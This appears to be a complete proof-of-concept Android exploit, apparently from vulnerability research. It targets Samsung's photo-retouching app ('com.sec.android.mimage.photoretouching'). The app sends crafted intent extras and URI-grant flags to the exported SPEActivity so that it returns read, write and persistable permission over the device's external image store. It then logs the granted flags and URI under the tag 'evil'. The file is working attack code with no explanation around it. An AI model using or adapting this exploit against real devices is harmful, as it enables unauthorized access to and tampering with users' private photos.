package poc.app;

import android.app.Activity;
import android.content.ClipData;
import android.content.Intent;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
        i.setClassName("com.sec.android.mimage.photoretouching", "com.sec.android.mimage.photoretouching.SPEActivity");
        i.setClipData(ClipData.newRawUri("", MediaStore.Images.Media.EXTERNAL_CONTENT_URI));
        i.putExtra("message_service", true);
        i.putExtra("service", "decoration");
        i.putExtra("filepath", MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        startActivityForResult(i, 0);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        Log.d("evil", "Flags: " + data.getFlags());
        Log.d("evil", "Uri: " + data.getClipData().getItemAt(0).getUri());
    }
}